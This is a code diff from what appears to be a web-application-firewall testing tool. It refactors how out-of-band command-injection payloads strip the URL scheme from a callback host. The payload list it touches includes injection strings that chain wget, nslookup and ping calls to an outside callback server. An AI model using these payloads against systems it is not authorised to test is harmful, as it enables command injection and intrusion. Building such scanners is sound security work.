@@ -18,6 +18,7 @@ import (
 	"github.com/waftester/waftester/pkg/finding"
 	"github.com/waftester/waftester/pkg/httpclient"
 	"github.com/waftester/waftester/pkg/iohelper"
+	"github.com/waftester/waftester/pkg/urlutil"
 )
 
 // InjectionType represents different command injection types
@@ -283,13 +284,13 @@ func (t *Tester) oobPayloads() []*Payload {
 			Value:       fmt.Sprintf(";wget %s/cmdi;", callback),
 			Description: "Out-of-band via wget"},
 		{Name: "Unix OOB nslookup", Type: InjectionBlind, Platform: PlatformUnix,
-			Value:       fmt.Sprintf(";nslookup cmdi.%s;", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
+			Value:       fmt.Sprintf(";nslookup cmdi.%s;", urlutil.StripScheme(callback)),
 			Description: "Out-of-band via DNS"},
 		{Name: "Windows OOB ping", Type: InjectionBlind, Platform: PlatformWindows,
-			Value:       fmt.Sprintf("&ping %s&", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
+			Value:       fmt.Sprintf("&ping %s&", urlutil.StripScheme(callback)),
 			Description: "Out-of-band via ping"},
 		{Name: "Windows OOB nslookup", Type: InjectionBlind, Platform: PlatformWindows,
-			Value:       fmt.Sprintf("&nslookup cmdi.%s&", strings.TrimPrefix(strings.TrimPrefix(callback, "https://"), "http://")),
+			Value:       fmt.Sprintf("&nslookup cmdi.%s&", urlutil.StripScheme(callback)),
 			Description: "Out-of-band via DNS"},
 	}
 }
